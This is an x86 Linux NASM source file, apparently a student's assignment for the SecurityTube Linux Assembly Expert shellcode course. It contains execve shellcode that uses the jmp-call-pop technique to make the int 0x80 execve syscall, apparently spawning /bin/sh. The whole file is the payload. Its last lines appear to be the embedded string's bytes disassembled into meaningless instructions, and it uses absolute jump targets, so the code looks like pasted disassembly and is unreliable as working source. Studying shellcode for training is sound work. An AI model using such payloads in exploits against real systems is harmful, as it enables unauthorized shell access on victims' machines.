; Filename:	execve_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	jmp short 0x1a
	pop esi
	xor eax,eax
	mov [esi+0x9],al
	mov [esi+0xa],esi
	mov [esi+0xe],eax
	mov al,0xb
	mov ebx,esi
	lea ecx,[esi+0xa]
	lea edx,[esi+0xe]
	int 0x80
	call 0x2
	das
	bound ebp,[ecx+0x6e]
	das
	fs popa
	jnc 0x90
	inc ecx
	inc edx
	inc edx
	inc edx
	inc edx
	inc ebx
	inc ebx
	inc ebx
	inc ebx

